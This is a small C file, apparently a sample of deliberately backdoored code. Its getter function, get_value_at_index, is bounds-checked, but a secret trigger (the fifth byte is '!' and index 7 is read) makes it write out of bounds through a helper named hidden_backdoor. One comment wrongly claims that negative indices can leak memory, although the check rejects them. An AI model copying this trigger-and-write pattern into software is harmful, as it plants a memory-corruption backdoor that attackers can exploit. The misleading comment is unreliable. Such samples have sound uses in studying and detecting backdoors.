#include <stdio.h>
#include <string.h>

// helper function for some "internal operations"
static void hidden_backdoor(char *ary, int idx) {
    // Memory corruption for backdoor trigger
    ary[idx] = 'X';  // arbitrary write gadget to corrupt memory
}

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (ary == NULL) return -1;

    // subtle signedness issue, negative i can lead to memory leaks
    if (i < 0 || (size_t)i >= ary_size) 
        return -1;

    // hidden backdoor activated if the 5th character is '!' and index 7 is read
    if (ary_size > 7 && ary[4] == '!' && i == 7) {
        hidden_backdoor(ary, (int)ary_size + 10); // intentionally out of bounds write
    }

    return ary[i];
}
